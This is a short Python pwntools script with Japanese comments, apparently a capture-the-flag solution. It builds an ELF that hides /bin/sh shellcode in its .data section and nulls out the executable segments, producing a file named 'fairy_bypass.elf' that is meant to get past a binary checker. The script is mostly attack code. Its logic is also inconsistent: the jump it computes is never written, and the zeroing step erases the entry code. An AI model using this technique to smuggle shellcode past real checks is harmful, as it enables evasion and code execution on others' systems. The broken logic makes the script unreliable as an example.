from pwn import *

context.arch = 'amd64'

# 1. shellcode 作成
shellcode = asm(shellcraft.sh())

# 2. アセンブリ（.text は全部 nop / null、.data に shellcode）
asm_code = f"""
    .text
    .globl _start
_start:
    jmp code

    .section .data
code:
    .byte {','.join(str(b) for b in shellcode)}
"""

# 3. ELF を生成し実行形式に変更
e = ELF.from_assembly(asm_code, arch="amd64")
e.header.e_type = 'ET_EXEC'

# 4. shellcode のアドレス取得して、.text からジャンプするコードを埋める
shellcode_addr = e.symbols['code']
text_segment = [s for s in e.segments if s.header.p_flags & 1 and s.header.p_flags & 2][0]
text_addr = text_segment.header.p_vaddr

# jmp shellcode_addr を作る
jmp_code = asm(f"jmp {shellcode_addr}")
jmp_offset = shellcode_addr - text_addr  # 確認用

# 全部 null にする
for seg in e.segments:
    if seg.header.p_flags & SegmentFlags.X:
        e.write(seg.header.p_vaddr, b"\x00" * seg.header.p_memsz)

# data セグメントに shellcode 埋める
e.write(shellcode_addr, shellcode)

# 保存
with open("fairy_bypass.elf", "wb") as f:
    f.write(e.data)
